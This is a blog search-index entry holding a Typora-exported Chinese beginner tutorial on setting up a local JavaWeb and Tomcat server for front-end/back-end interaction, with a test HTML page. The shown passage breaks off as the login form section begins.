<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2021/12/24/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/"/>
    <url>/2021/12/24/%E5%89%8D%E5%90%8E%E7%AB%AF/%E5%88%9D%E6%8E%A2%E5%89%8D%E5%90%8E%E7%AB%AF%E4%BA%A4%E4%BA%92/</url>
    
    <content type="html"><![CDATA[<!doctype html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width initial-scale=1"><link href="https://fonts.loli.net/css?family=Open+Sans:400italic,700italic,700,400&subset=latin,latin-ext" rel="stylesheet" type="text/css"><style type="text/css">html {overflow-x: initial !important;}:root { --bg-color:#ffffff; --text-color:#333333; --select-text-bg-color:#B5D6FC; --select-text-font-color:auto; --monospace:"Lucida Console",Consolas,"Courier",monospace; --title-bar-height:20px; }.mac-os-11 { --title-bar-height:28px; }html { font-size: 14px; background-color: var(--bg-color); color: var(--text-color); font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; }body { margin: 0px; padding: 0px; height: auto; inset: 0px; font-size: 1rem; line-height: 1.42857; overflow-x: hidden; background: inherit; tab-size: 4; }iframe { margin: auto; }a.url { word-break: break-all; }a:active, a:hover { outline: 0px; }.in-text-selection, ::selection { text-shadow: none; background: var(--select-text-bg-color); color: var(--select-text-font-color); }#write { margin: 0px auto; height: auto; width: inherit; word-break: normal; overflow-wrap: break-word; position: relative; white-space: normal; overflow-x: visible; padding-top: 36px; }#write.first-line-indent p { text-indent: 2em; }#write.first-line-indent li p, #write.first-line-indent p * { text-indent: 0px; }#write.first-line-indent li { margin-left: 2em; }.for-image #write { padding-left: 8px; padding-right: 8px; }body.typora-export { padding-left: 30px; padding-right: 30px; }.typora-export .footnote-line, .typora-export li, .typora-export p { white-space: pre-wrap; }.typora-export .task-list-item input { pointer-events: none; }@media screen and (max-width: 500px) {  body.typora-export { padding-left: 0px; padding-right: 0px; }  #write { padding-left: 20px; padding-right: 20px; }  .CodeMirror-sizer { margin-left: 0px !important; }  .CodeMirror-gutters { display: none !important; }}#write li > figure:last-child { margin-bottom: 0.5rem; }#write ol, #write ul { position: relative; }img { max-width: 100%; vertical-align: middle; image-orientation: from-image; }button, input, select, textarea { color: inherit; font: inherit; }input[type="checkbox"], input[type="radio"] { line-height: normal; padding: 0px; }*, ::after, ::before { box-sizing: border-box; }#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p, #write pre { width: inherit; }#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p { position: relative; }p { line-height: inherit; }h1, h2, h3, h4, h5, h6 { break-after: avoid-page; break-inside: avoid; orphans: 4; }p { orphans: 4; }h1 { font-size: 2rem; }h2 { font-size: 1.8rem; }h3 { font-size: 1.6rem; }h4 { font-size: 1.4rem; }h5 { font-size: 1.2rem; }h6 { font-size: 1rem; }.md-math-block, .md-rawblock, h1, h2, h3, h4, h5, h6, p { margin-top: 1rem; margin-bottom: 1rem; }.hidden { display: none; }.md-blockmeta { color: rgb(204, 204, 204); font-weight: 700; font-style: italic; }a { cursor: pointer; }sup.md-footnote { padding: 2px 4px; background-color: rgba(238, 238, 238, 0.7); color: rgb(85, 85, 85); border-radius: 4px; cursor: pointer; }sup.md-footnote a, sup.md-footnote a:hover { color: inherit; text-transform: inherit; text-decoration: inherit; }#write input[type="checkbox"] { cursor: pointer; width: inherit; height: inherit; }figure { overflow-x: auto; margin: 1.2em 0px; max-width: calc(100% + 16px); padding: 0px; }figure > table { margin: 0px; }tr { break-inside: avoid; break-after: auto; }thead { display: table-header-group; }table { border-collapse: collapse; border-spacing: 0px; width: 100%; overflow: auto; break-inside: auto; text-align: left; }table.md-table td { min-width: 32px; }.CodeMirror-gutters { border-right: 0px; background-color: inherit; }.CodeMirror-linenumber { user-select: none; }.CodeMirror { text-align: left; }.CodeMirror-placeholder { opacity: 0.3; }.CodeMirror pre { padding: 0px 4px; }.CodeMirror-lines { padding: 0px; }div.hr:focus { cursor: none; }#write pre { white-space: pre-wrap; }#write.fences-no-line-wrapping pre { white-space: pre; }#write pre.ty-contain-cm { white-space: normal; }.CodeMirror-gutters { margin-right: 4px; }.md-fences { font-size: 0.9rem; display: block; break-inside: avoid; text-align: left; overflow: visible; white-space: pre; background: inherit; position: relative !important; }.md-fences-adv-panel { width: 100%; margin-top: 10px; text-align: center; padding-top: 0px; padding-bottom: 8px; overflow-x: auto; }#write .md-fences.mock-cm { white-space: pre-wrap; }.md-fences.md-fences-with-lineno { padding-left: 0px; }#write.fences-no-line-wrapping .md-fences.mock-cm { white-space: pre; overflow-x: auto; }.md-fences.mock-cm.md-fences-with-lineno { padding-left: 8px; }.CodeMirror-line, twitterwidget { break-inside: avoid; }.footnotes { opacity: 0.8; font-size: 0.9rem; margin-top: 1em; margin-bottom: 1em; }.footnotes + .footnotes { margin-top: 0px; }.md-reset { margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: top; background: 0px 0px; text-decoration: none; text-shadow: none; float: none; position: static; width: auto; height: auto; white-space: nowrap; cursor: inherit; -webkit-tap-highlight-color: transparent; line-height: normal; font-weight: 400; text-align: left; box-sizing: content-box; direction: ltr; }li div { padding-top: 0px; }blockquote { margin: 1rem 0px; }li .mathjax-block, li p { margin: 0.5rem 0px; }li blockquote { margin: 1rem 0px; }li { margin: 0px; position: relative; }blockquote > :last-child { margin-bottom: 0px; }blockquote > :first-child, li > :first-child { margin-top: 0px; }.footnotes-area { color: rgb(136, 136, 136); margin-top: 0.714rem; padding-bottom: 0.143rem; white-space: normal; }#write .footnote-line { white-space: pre-wrap; }@media print {  body, html { border: 1px solid transparent; height: 99%; break-after: avoid; break-before: avoid; font-variant-ligatures: no-common-ligatures; }  #write { margin-top: 0px; padding-top: 0px; border-color: transparent !important; }  .typora-export * { -webkit-print-color-adjust: exact; }  .typora-export #write { break-after: avoid; }  .typora-export #write::after { height: 0px; }  .is-mac table { break-inside: avoid; }  .typora-export-show-outline .typora-export-sidebar { display: none; }}.footnote-line { margin-top: 0.714em; font-size: 0.7em; }a img, img a { cursor: pointer; }pre.md-meta-block { font-size: 0.8rem; min-height: 0.8rem; white-space: pre-wrap; background: rgb(204, 204, 204); display: block; overflow-x: hidden; }p > .md-image:only-child:not(.md-img-error) img, p > img:only-child { display: block; margin: auto; }#write.first-line-indent p > .md-image:only-child:not(.md-img-error) img { left: -2em; position: relative; }p > .md-image:only-child { display: inline-block; width: 100%; }#write .MathJax_Display { margin: 0.8em 0px 0px; }.md-math-block { width: 100%; }.md-math-block:not(:empty)::after { display: none; }.MathJax_ref { fill: currentcolor; }[contenteditable="true"]:active, [contenteditable="true"]:focus, [contenteditable="false"]:active, [contenteditable="false"]:focus { outline: 0px; box-shadow: none; }.md-task-list-item { position: relative; list-style-type: none; }.task-list-item.md-task-list-item { padding-left: 0px; }.md-task-list-item > input { position: absolute; top: 0px; left: 0px; margin-left: -1.2em; margin-top: calc(1em - 10px); border: none; }.math { font-size: 1rem; }.md-toc { min-height: 3.58rem; position: relative; font-size: 0.9rem; border-radius: 10px; }.md-toc-content { position: relative; margin-left: 0px; }.md-toc-content::after, .md-toc::after { display: none; }.md-toc-item { display: block; color: rgb(65, 131, 196); }.md-toc-item a { text-decoration: none; }.md-toc-inner:hover { text-decoration: underline; }.md-toc-inner { display: inline-block; cursor: pointer; }.md-toc-h1 .md-toc-inner { margin-left: 0px; font-weight: 700; }.md-toc-h2 .md-toc-inner { margin-left: 2em; }.md-toc-h3 .md-toc-inner { margin-left: 4em; }.md-toc-h4 .md-toc-inner { margin-left: 6em; }.md-toc-h5 .md-toc-inner { margin-left: 8em; }.md-toc-h6 .md-toc-inner { margin-left: 10em; }@media screen and (max-width: 48em) {  .md-toc-h3 .md-toc-inner { margin-left: 3.5em; }  .md-toc-h4 .md-toc-inner { margin-left: 5em; }  .md-toc-h5 .md-toc-inner { margin-left: 6.5em; }  .md-toc-h6 .md-toc-inner { margin-left: 8em; }}a.md-toc-inner { font-size: inherit; font-style: inherit; font-weight: inherit; line-height: inherit; }.footnote-line a:not(.reversefootnote) { color: inherit; }.md-attr { display: none; }.md-fn-count::after { content: "."; }code, pre, samp, tt { font-family: var(--monospace); }kbd { margin: 0px 0.1em; padding: 0.1em 0.6em; font-size: 0.8em; color: rgb(36, 39, 41); background: rgb(255, 255, 255); border: 1px solid rgb(173, 179, 185); border-radius: 3px; box-shadow: rgba(12, 13, 14, 0.2) 0px 1px 0px, rgb(255, 255, 255) 0px 0px 0px 2px inset; white-space: nowrap; vertical-align: middle; }.md-comment { color: rgb(162, 127, 3); opacity: 0.6; font-family: var(--monospace); }code { text-align: left; vertical-align: initial; }a.md-print-anchor { white-space: pre !important; border-width: initial !important; border-style: none !important; border-color: initial !important; display: inline-block !important; position: absolute !important; width: 1px !important; right: 0px !important; outline: 0px !important; background: 0px 0px !important; text-decoration: initial !important; text-shadow: initial !important; }.os-windows.monocolor-emoji .md-emoji { font-family: "Segoe UI Symbol", sans-serif; }.md-diagram-panel > svg { max-width: 100%; }[lang="flow"] svg, [lang="mermaid"] svg { max-width: 100%; height: auto; }[lang="mermaid"] .node text { font-size: 1rem; }table tr th { border-bottom: 0px; }video { max-width: 100%; display: block; margin: 0px auto; }iframe { max-width: 100%; width: 100%; border: none; }.highlight td, .highlight tr { border: 0px; }mark { background: rgb(255, 255, 0); color: rgb(0, 0, 0); }.md-html-inline .md-plain, .md-html-inline strong, mark .md-inline-math, mark strong { color: inherit; }.md-expand mark .md-meta { opacity: 0.3 !important; }mark .md-meta { color: rgb(0, 0, 0); }@media print {  .typora-export h1, .typora-export h2, .typora-export h3, .typora-export h4, .typora-export h5, .typora-export h6 { break-inside: avoid; }}.md-diagram-panel .messageText { stroke: none !important; }.md-diagram-panel .start-state { fill: var(--node-fill); }.md-diagram-panel .edgeLabel rect { opacity: 1 !important; }.md-fences.md-fences-math { font-size: 1em; }.md-fences-advanced:not(.md-focus) { padding: 0px; white-space: nowrap; border: 0px; }.md-fences-advanced:not(.md-focus) { background: inherit; }.typora-export-show-outline .typora-export-content { max-width: 1440px; margin: auto; display: flex; flex-direction: row; }.typora-export-sidebar { width: 300px; font-size: 0.8rem; margin-top: 80px; margin-right: 18px; }.typora-export-show-outline #write { --webkit-flex:2; flex: 2 1 0%; }.typora-export-sidebar .outline-content { position: fixed; top: 0px; max-height: 100%; overflow: hidden auto; padding-bottom: 30px; padding-top: 60px; width: 300px; }@media screen and (max-width: 1024px) {  .typora-export-sidebar, .typora-export-sidebar .outline-content { width: 240px; }}@media screen and (max-width: 800px) {  .typora-export-sidebar { display: none; }}.outline-content li, .outline-content ul { margin-left: 0px; margin-right: 0px; padding-left: 0px; padding-right: 0px; list-style: none; }.outline-content ul { margin-top: 0px; margin-bottom: 0px; }.outline-content strong { font-weight: 400; }.outline-expander { width: 1rem; height: 1.42857rem; position: relative; display: table-cell; vertical-align: middle; cursor: pointer; padding-left: 4px; }.outline-expander::before { content: ""; position: relative; font-family: Ionicons; display: inline-block; font-size: 8px; vertical-align: middle; }.outline-item { padding-top: 3px; padding-bottom: 3px; cursor: pointer; }.outline-expander:hover::before { content: ""; }.outline-h1 > .outline-item { padding-left: 0px; }.outline-h2 > .outline-item { padding-left: 1em; }.outline-h3 > .outline-item { padding-left: 2em; }.outline-h4 > .outline-item { padding-left: 3em; }.outline-h5 > .outline-item { padding-left: 4em; }.outline-h6 > .outline-item { padding-left: 5em; }.outline-label { cursor: pointer; display: table-cell; vertical-align: middle; text-decoration: none; color: inherit; }.outline-label:hover { text-decoration: underline; }.outline-item:hover { border-color: rgb(245, 245, 245); background-color: var(--item-hover-bg-color); }.outline-item:hover { margin-left: -28px; margin-right: -28px; border-left: 28px solid transparent; border-right: 28px solid transparent; }.outline-item-single .outline-expander::before, .outline-item-single .outline-expander:hover::before { display: none; }.outline-item-open > .outline-item > .outline-expander::before { content: ""; }.outline-children { display: none; }.info-panel-tab-wrapper { display: none; }.outline-item-open > .outline-children { display: block; }.typora-export .outline-item { padding-top: 1px; padding-bottom: 1px; }.typora-export .outline-item:hover { margin-right: -8px; border-right: 8px solid transparent; }.typora-export .outline-expander::before { content: "+"; font-family: inherit; top: -1px; }.typora-export .outline-expander:hover::before, .typora-export .outline-item-open > .outline-item > .outline-expander::before { content: "−"; }.typora-export-collapse-outline .outline-children { display: none; }.typora-export-collapse-outline .outline-item-open > .outline-children, .typora-export-no-collapse-outline .outline-children { display: block; }.typora-export-no-collapse-outline .outline-expander::before { content: "" !important; }.typora-export-show-outline .outline-item-active > .outline-item .outline-label { font-weight: 700; }.md-inline-math-container mjx-container { zoom: 0.95; }.CodeMirror { height: auto; }.CodeMirror.cm-s-inner { background: inherit; }.CodeMirror-scroll { overflow: auto hidden; z-index: 3; }.CodeMirror-gutter-filler, .CodeMirror-scrollbar-filler { background-color: rgb(255, 255, 255); }.CodeMirror-gutters { border-right: 1px solid rgb(221, 221, 221); background: inherit; white-space: nowrap; }.CodeMirror-linenumber { padding: 0px 3px 0px 5px; text-align: right; color: rgb(153, 153, 153); }.cm-s-inner .cm-keyword { color: rgb(119, 0, 136); }.cm-s-inner .cm-atom, .cm-s-inner.cm-atom { color: rgb(34, 17, 153); }.cm-s-inner .cm-number { color: rgb(17, 102, 68); }.cm-s-inner .cm-def { color: rgb(0, 0, 255); }.cm-s-inner .cm-variable { color: rgb(0, 0, 0); }.cm-s-inner .cm-variable-2 { color: rgb(0, 85, 170); }.cm-s-inner .cm-variable-3 { color: rgb(0, 136, 85); }.cm-s-inner .cm-string { color: rgb(170, 17, 17); }.cm-s-inner .cm-property { color: rgb(0, 0, 0); }.cm-s-inner .cm-operator { color: rgb(152, 26, 26); }.cm-s-inner .cm-comment, .cm-s-inner.cm-comment { color: rgb(170, 85, 0); }.cm-s-inner .cm-string-2 { color: rgb(255, 85, 0); }.cm-s-inner .cm-meta { color: rgb(85, 85, 85); }.cm-s-inner .cm-qualifier { color: rgb(85, 85, 85); }.cm-s-inner .cm-builtin { color: rgb(51, 0, 170); }.cm-s-inner .cm-bracket { color: rgb(153, 153, 119); }.cm-s-inner .cm-tag { color: rgb(17, 119, 0); }.cm-s-inner .cm-attribute { color: rgb(0, 0, 204); }.cm-s-inner .cm-header, .cm-s-inner.cm-header { color: rgb(0, 0, 255); }.cm-s-inner .cm-quote, .cm-s-inner.cm-quote { color: rgb(0, 153, 0); }.cm-s-inner .cm-hr, .cm-s-inner.cm-hr { color: rgb(153, 153, 153); }.cm-s-inner .cm-link, .cm-s-inner.cm-link { color: rgb(0, 0, 204); }.cm-negative { color: rgb(221, 68, 68); }.cm-positive { color: rgb(34, 153, 34); }.cm-header, .cm-strong { font-weight: 700; }.cm-del { text-decoration: line-through; }.cm-em { font-style: italic; }.cm-link { text-decoration: underline; }.cm-error { color: red; }.cm-invalidchar { color: red; }.cm-constant { color: rgb(38, 139, 210); }.cm-defined { color: rgb(181, 137, 0); }div.CodeMirror span.CodeMirror-matchingbracket { color: rgb(0, 255, 0); }div.CodeMirror span.CodeMirror-nonmatchingbracket { color: rgb(255, 34, 34); }.cm-s-inner .CodeMirror-activeline-background { background: inherit; }.CodeMirror { position: relative; overflow: hidden; }.CodeMirror-scroll { height: 100%; outline: 0px; position: relative; box-sizing: content-box; background: inherit; }.CodeMirror-sizer { position: relative; }.CodeMirror-gutter-filler, .CodeMirror-hscrollbar, .CodeMirror-scrollbar-filler, .CodeMirror-vscrollbar { position: absolute; z-index: 6; display: none; outline: 0px; }.CodeMirror-vscrollbar { right: 0px; top: 0px; overflow: hidden; }.CodeMirror-hscrollbar { bottom: 0px; left: 0px; overflow: auto hidden; }.CodeMirror-scrollbar-filler { right: 0px; bottom: 0px; }.CodeMirror-gutter-filler { left: 0px; bottom: 0px; }.CodeMirror-gutters { position: absolute; left: 0px; top: 0px; padding-bottom: 10px; z-index: 3; overflow-y: hidden; }.CodeMirror-gutter { white-space: normal; height: 100%; box-sizing: content-box; padding-bottom: 30px; margin-bottom: -32px; display: inline-block; }.CodeMirror-gutter-wrapper { position: absolute; z-index: 4; background: 0px 0px !important; border: none !important; }.CodeMirror-gutter-background { position: absolute; top: 0px; bottom: 0px; z-index: 4; }.CodeMirror-gutter-elt { position: absolute; cursor: default; z-index: 4; }.CodeMirror-lines { cursor: text; }.CodeMirror pre { border-radius: 0px; border-width: 0px; background: 0px 0px; font-family: inherit; font-size: inherit; margin: 0px; white-space: pre; overflow-wrap: normal; color: inherit; z-index: 2; position: relative; overflow: visible; }.CodeMirror-wrap pre { overflow-wrap: break-word; white-space: pre-wrap; word-break: normal; }.CodeMirror-code pre { border-right: 30px solid transparent; width: fit-content; }.CodeMirror-wrap .CodeMirror-code pre { border-right: none; width: auto; }.CodeMirror-linebackground { position: absolute; inset: 0px; z-index: 0; }.CodeMirror-linewidget { position: relative; z-index: 2; overflow: auto; }.CodeMirror-wrap .CodeMirror-scroll { overflow-x: hidden; }.CodeMirror-measure { position: absolute; width: 100%; height: 0px; overflow: hidden; visibility: hidden; }.CodeMirror-measure pre { position: static; }.CodeMirror div.CodeMirror-cursor { position: absolute; visibility: hidden; border-right: none; width: 0px; }.CodeMirror div.CodeMirror-cursor { visibility: hidden; }.CodeMirror-focused div.CodeMirror-cursor { visibility: inherit; }.cm-searching { background: rgba(255, 255, 0, 0.4); }span.cm-underlined { text-decoration: underline; }span.cm-strikethrough { text-decoration: line-through; }.cm-tw-syntaxerror { color: rgb(255, 255, 255); background-color: rgb(153, 0, 0); }.cm-tw-deleted { text-decoration: line-through; }.cm-tw-header5 { font-weight: 700; }.cm-tw-listitem:first-child { padding-left: 10px; }.cm-tw-box { border-style: solid; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px; border-color: inherit; border-top-width: 0px !important; }.cm-tw-underline { text-decoration: underline; }@media print {  .CodeMirror div.CodeMirror-cursor { visibility: hidden; }}:root {    --side-bar-bg-color: #fafafa;    --control-text-color: #777;}@include-when-export url(https://fonts.loli.net/css?family=Open+Sans:400italic,700italic,700,400&subset=latin,latin-ext);/* open-sans-regular - latin-ext_latin */  /* open-sans-italic - latin-ext_latin */    /* open-sans-700 - latin-ext_latin */    /* open-sans-700italic - latin-ext_latin */  html {    font-size: 16px;    -webkit-font-smoothing: antialiased;}body {    font-family: "Open Sans","Clear Sans", "Helvetica Neue", Helvetica, Arial, 'Segoe UI Emoji', sans-serif;    color: rgb(51, 51, 51);    line-height: 1.6;}#write {    max-width: 860px;  margin: 0 auto;  padding: 30px;    padding-bottom: 100px;}@media only screen and (min-width: 1400px) {#write {max-width: 1024px;}}@media only screen and (min-width: 1800px) {#write {max-width: 1200px;}}#write > ul:first-child,#write > ol:first-child{    margin-top: 30px;}a {    color: #4183C4;}h1,h2,h3,h4,h5,h6 {    position: relative;    margin-top: 1rem;    margin-bottom: 1rem;    font-weight: bold;    line-height: 1.4;    cursor: text;}h1:hover a.anchor,h2:hover a.anchor,h3:hover a.anchor,h4:hover a.anchor,h5:hover a.anchor,h6:hover a.anchor {    text-decoration: none;}h1 tt,h1 code {    font-size: inherit;}h2 tt,h2 code {    font-size: inherit;}h3 tt,h3 code {    font-size: inherit;}h4 tt,h4 code {    font-size: inherit;}h5 tt,h5 code {    font-size: inherit;}h6 tt,h6 code {    font-size: inherit;}h1 {    font-size: 2.25em;    line-height: 1.2;    border-bottom: 1px solid #eee;}h2 {    font-size: 1.75em;    line-height: 1.225;    border-bottom: 1px solid #eee;}/*@media print {    .typora-export h1,    .typora-export h2 {        border-bottom: none;        padding-bottom: initial;    }    .typora-export h1::after,    .typora-export h2::after {        content: "";        display: block;        height: 100px;        margin-top: -96px;        border-top: 1px solid #eee;    }}*/h3 {    font-size: 1.5em;    line-height: 1.43;}h4 {    font-size: 1.25em;}h5 {    font-size: 1em;}h6 {   font-size: 1em;    color: #777;}p,blockquote,ul,ol,dl,table{    margin: 0.8em 0;}li>ol,li>ul {    margin: 0 0;}hr {    height: 2px;    padding: 0;    margin: 16px 0;    background-color: #e7e7e7;    border: 0 none;    overflow: hidden;    box-sizing: content-box;}li p.first {    display: inline-block;}ul,ol {    padding-left: 30px;}ul:first-child,ol:first-child {    margin-top: 0;}ul:last-child,ol:last-child {    margin-bottom: 0;}blockquote {    border-left: 4px solid #dfe2e5;    padding: 0 15px;    color: #777777;}blockquote blockquote {    padding-right: 0;}table {    padding: 0;    word-break: initial;}table tr {    border: 1px solid #dfe2e5;    margin: 0;    padding: 0;}table tr:nth-child(2n),thead {    background-color: #f8f8f8;}table th {    font-weight: bold;    border: 1px solid #dfe2e5;    border-bottom: 0;    margin: 0;    padding: 6px 13px;}table td {    border: 1px solid #dfe2e5;    margin: 0;    padding: 6px 13px;}table th:first-child,table td:first-child {    margin-top: 0;}table th:last-child,table td:last-child {    margin-bottom: 0;}.CodeMirror-lines {    padding-left: 4px;}.code-tooltip {    box-shadow: 0 1px 1px 0 rgba(0,28,36,.3);    border-top: 1px solid #eef2f2;}.md-fences,code,tt {    border: 1px solid #e7eaed;    background-color: #f8f8f8;    border-radius: 3px;    padding: 0;    padding: 2px 4px 0px 4px;    font-size: 0.9em;}code {    background-color: #f3f4f4;    padding: 0 2px 0 2px;}.md-fences {    margin-bottom: 15px;    margin-top: 15px;    padding-top: 8px;    padding-bottom: 6px;}.md-task-list-item > input {  margin-left: -1.3em;}@media print {    html {        font-size: 13px;    }    table,    pre {        page-break-inside: avoid;    }    pre {        word-wrap: break-word;    }}.md-fences {background-color: #f8f8f8;}#write pre.md-meta-block {padding: 1rem;    font-size: 85%;    line-height: 1.45;    background-color: #f7f7f7;    border: 0;    border-radius: 3px;    color: #777777;    margin-top: 0 !important;}.mathjax-block>.code-tooltip {bottom: .375rem;}.md-mathjax-midline {    background: #fafafa;}#write>h3.md-focus:before{left: -1.5625rem;top: .375rem;}#write>h4.md-focus:before{left: -1.5625rem;top: .285714286rem;}#write>h5.md-focus:before{left: -1.5625rem;top: .285714286rem;}#write>h6.md-focus:before{left: -1.5625rem;top: .285714286rem;}.md-image>.md-meta {    /*border: 1px solid #ddd;*/    border-radius: 3px;    padding: 2px 0px 0px 4px;    font-size: 0.9em;    color: inherit;}.md-tag {    color: #a7a7a7;    opacity: 1;}.md-toc {     margin-top:20px;    padding-bottom:20px;}.sidebar-tabs {    border-bottom: none;}#typora-quick-open {    border: 1px solid #ddd;    background-color: #f8f8f8;}#typora-quick-open-item {    background-color: #FAFAFA;    border-color: #FEFEFE #e5e5e5 #e5e5e5 #eee;    border-style: solid;    border-width: 1px;}/** focus mode */.on-focus-mode blockquote {    border-left-color: rgba(85, 85, 85, 0.12);}header, .context-menu, .megamenu-content, footer{    font-family: "Segoe UI", "Arial", sans-serif;}.file-node-content:hover .file-node-icon,.file-node-content:hover .file-node-open-state{    visibility: visible;}.mac-seamless-mode #typora-sidebar {    background-color: #fafafa;    background-color: var(--side-bar-bg-color);}.md-lang {    color: #b4654d;}/*.html-for-mac {    --item-hover-bg-color: #E6F0FE;}*/#md-notification .btn {    border: 0;}.dropdown-menu .divider {    border-color: #e5e5e5;    opacity: 0.4;}.ty-preferences .window-content {    background-color: #fafafa;}.ty-preferences .nav-group-item.active {    color: white;    background: #999;}.menu-item-container a.menu-style-btn {    background-color: #f5f8fa;    background-image: linear-gradient( 180deg , hsla(0, 0%, 100%, 0.8), hsla(0, 0%, 100%, 0)); }</style><title>初探前后端交互</title></head><body class="typora-export os-windows"><div class="typora-export-content"><div id="write" class><h1 id="初探前后端交互"><span>初探前后端交互</span></h1><h2 id="如有错误请不吝指出"><span>如有错误请不吝指出</span></h2><span id="more"></span><h6 id="由于学习网络协议需通过cs进行试验故利用javawebtomcat搭建本地服务由于本人没有服务器开发经验故此文章仅记录搭建基础操作"><span>由于学习网络协议，需通过C/S进行试验，故利用JavaWeb+TomCat搭建本地服务。由于本人没有服务器开发经验，故此文章仅记录搭建基础操作</span></h6><h2 id="step1准备"><span>Step1(准备):</span></h2><ol start><li><h6 id="创建空pooject并导入java模块"><span>创建空pooject并导入java模块</span></h6></li><li><h6 id="添加javaweb框架"><span>添加JavaWeb框架</span></h6></li><li><h6 id="部署tomcat以及导入tomcat外部库相当于服务器托管给tomcat"><span>部署TomCat以及导入Tomcat外部库(相当于服务器托管给TomCat)</span></h6></li></ol><h2 id="step2前端测试"><span>Step2(前端测试)：</span></h2><ol start><li><h6 id="web文件夹下创建html文件夹用于存放html代码以下为本地测试html代码"><span>web文件夹下创建HTML文件夹用于存放HTML代码，以下为本地测试HTML代码</span></h6><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.5px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;!DOCTYPE html&gt;</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">html</span> <span class="cm-attribute">lang</span>=<span class="cm-string">"en"</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">head</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">meta</span> <span class="cm-attribute">charset</span>=<span class="cm-string">"UTF-8"</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">title</span><span class="cm-tag cm-bracket">&gt;</span>Title<span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">title</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">head</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">body</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">this is a test .html</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">body</span><span class="cm-tag cm-bracket">&gt;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">html</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 230px;"></div><div class="CodeMirror-gutters" style="display: none; height: 230px;"></div></div></div></pre><h6 id="2web文件夹相当于网站根路径访问httplocalhost8080htmltesthtml即可访问"><span>2.Web文件夹相当于网站根路径,访问</span><a href="http://localhost:8080/html/test.html" target="_blank" class="url">http://localhost:8080/html/test.html</a><span>即可访问</span></h6></li></ol><h2 id="step3前后端交互"><span>Step3(前后端交互):</span></h2><ol start><li><h6 id="web文件夹下创建loginhtml构建一个form表单"><span>web文件夹下创建login.html,构建一个form表单</span></h6><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="html" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.5px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style><div 